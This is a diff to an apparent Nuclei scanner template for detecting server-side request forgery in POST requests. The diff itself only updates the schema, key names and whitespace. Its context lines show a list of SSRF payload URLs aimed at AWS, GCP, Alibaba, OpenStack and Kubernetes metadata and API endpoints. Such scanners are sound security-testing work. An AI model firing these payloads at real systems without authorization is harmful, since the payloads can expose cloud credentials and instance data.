@@ -1,12 +1,13 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: mr12-ssrfPost
 info:
-  name: SSRF Detection for POST 
+  name: SSRF Detection for POST
   description: Template to check for Server-Side Request Forgery (SSRF) vulnerabilities ; chage the post requests
   severity: high
   author: mr12
   tags:
     - ssrf
-requests:
+http:
   - raw:
       - |-
         POST endpoing HTTP/2
@@ -99,7 +100,7 @@ requests:
         - http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
         - http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json
         - http://169.254.169.254/metadata/v1.json
-        - http://169.254.169.254/metadata/v1/ 
+        - http://169.254.169.254/metadata/v1/
         - http://169.254.169.254/metadata/v1/id
         - http://169.254.169.254/metadata/v1/user-data
         - http://169.254.169.254/metadata/v1/hostname
@@ -112,7 +113,7 @@ requests:
         - http://100.100.100.200/latest/meta-data/
         - http://100.100.100.200/latest/meta-data/instance-id
         - http://100.100.100.200/latest/meta-data/image-id
-        - http://169.254.169.254/openstack	 
+        - http://169.254.169.254/openstack
         - http://192.0.0.192/latest/
         - http://192.0.0.192/latest/user-data/
         - http://192.0.0.192/latest/meta-data/
@@ -120,7 +121,7 @@ requests:
         - https://kubernetes.default.svc.cluster.local
         - https://kubernetes.default
         - https://kubernetes.default.svc/metrics
-  
+
     matchers-condition: and
     matchers:
       - type: status
